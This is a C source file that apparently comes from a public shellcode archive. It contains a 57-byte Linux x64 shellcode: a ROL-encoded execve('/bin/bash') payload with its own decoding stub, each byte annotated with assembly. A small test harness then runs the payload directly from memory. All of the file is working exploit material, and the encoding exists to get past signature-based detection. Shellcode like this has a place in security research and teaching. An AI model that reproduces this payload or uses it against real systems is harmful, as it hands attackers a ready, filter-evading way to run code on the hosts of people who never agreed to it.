// Shellcode Title:  Linux/x64 - ROL Encoded Execve Shellcode (57 bytes)
// Shellcode Author: Bobby Cooke
#include<stdio.h>
#include<string.h>

unsigned char shellcode[] = \
"\xeb\x0d"              // jmp short call_decoder
// decoder:
"\x5e"                  // pop rsi = &String
// decode:
"\xd0\x0e"              // ror byte [rsi], 1
"\x80\x3e\x55"          // cmp byte [rsi], 0x55 - last byte? ror 0xaa, 1 = 0x55
"\x74\x0a"              // je Shellcode - End? Jump to shellcode!
"\x48\xff\xc6"          // inc rsi - Not end? move 2 next byte
"\xeb\xf4"              // jmp short decode - loop 2 decode next byte
// call_decoder:
"\xe8\xee\xff\xff\xff"  // call decoder // go 2 decode loop
// Execve(/bin/bash) ROL Encoded Shellcode
"\x90\x62\xed\x90\xef\xcd\x90\x62\xff\xae\x90\x07\x85"
"\xd0\xa4\x90\x75\x5e\xc4\xd2\xdc\x5e\xc4\xc2\xe6\xa4"
"\x90\x62\xa5\x90\x13\xcf\x61\x76\x1e\x0a\xaa";

int main()
{
        printf("Shellcode Length:  %d\n", strlen(shellcode));
        int (*ret)() = (int(*)())shellcode;
        ret();
}


